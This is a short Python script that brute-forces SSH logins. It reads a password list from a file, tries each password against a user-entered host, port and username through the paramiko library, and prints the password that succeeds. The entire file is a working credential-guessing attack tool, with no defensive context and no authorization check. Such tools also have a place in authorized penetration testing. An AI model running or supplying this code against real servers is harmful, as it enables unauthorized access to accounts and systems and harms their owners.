# ssh_brute_force.py
import paramiko

def ssh_brute_force(host, port, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            client.connect(host, port=port, username=username, password=password, timeout=2)
            print(f"Success! Password: {password}")
            client.close()
            return
        except:
            print(f"Failed: {password}")
    print("Brute force completed. Password not found.")

if __name__ == "__main__":
    target = input("Enter SSH server IP: ")
    ssh_port = int(input("Enter SSH port (default 22): ") or 22)
    user = input("Enter SSH username: ")
    pwd_file = input("Enter path to password list: ")
    with open(pwd_file, 'r') as f:
        passwords = f.read().splitlines()
    ssh_brute_force(target, ssh_port, user, passwords)
